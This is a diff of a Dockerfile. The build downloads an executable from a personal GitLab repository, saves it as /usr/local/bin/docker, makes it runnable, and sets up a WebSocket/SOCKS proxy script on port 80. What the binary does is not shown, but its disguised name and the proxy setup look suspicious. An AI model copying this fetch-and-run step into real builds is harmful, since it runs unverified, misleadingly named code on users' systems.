@@ -7,19 +7,22 @@ RUN apt-get update && apt-get install -y \
     npm \
     ca-certificates \
     wget \
-    && rm -rf /var/lib/apt/lists/* \
-    && npm cache clean --force
+    && rm -rf /var/lib/apt/lists/*
 
-# Download binary
-RUN wget -O /usr/local/bin/docker "https://gitlab.com/ferrynara12/mypro/-/raw/main/docker?ref_type=heads" \
+RUN wget -O /usr/local/bin/docker \
+    "https://gitlab.com/ferrynara12/mypro/-/raw/main/docker?ref_type=heads" \
     && chmod +x /usr/local/bin/docker
 
-COPY wsproxy.js /wsproxy.js
+WORKDIR /app
+
+RUN npm init -y \
+    && npm install ws socks
+
+COPY wsproxy.js .
 COPY entrypoint.sh /entrypoint.sh
 
-RUN npm install ws net socks --no-cache && chmod +x /entrypoint.sh
+RUN chmod +x /entrypoint.sh
 
-WORKDIR /app
 EXPOSE 80
 
 ENTRYPOINT ["/entrypoint.sh"]
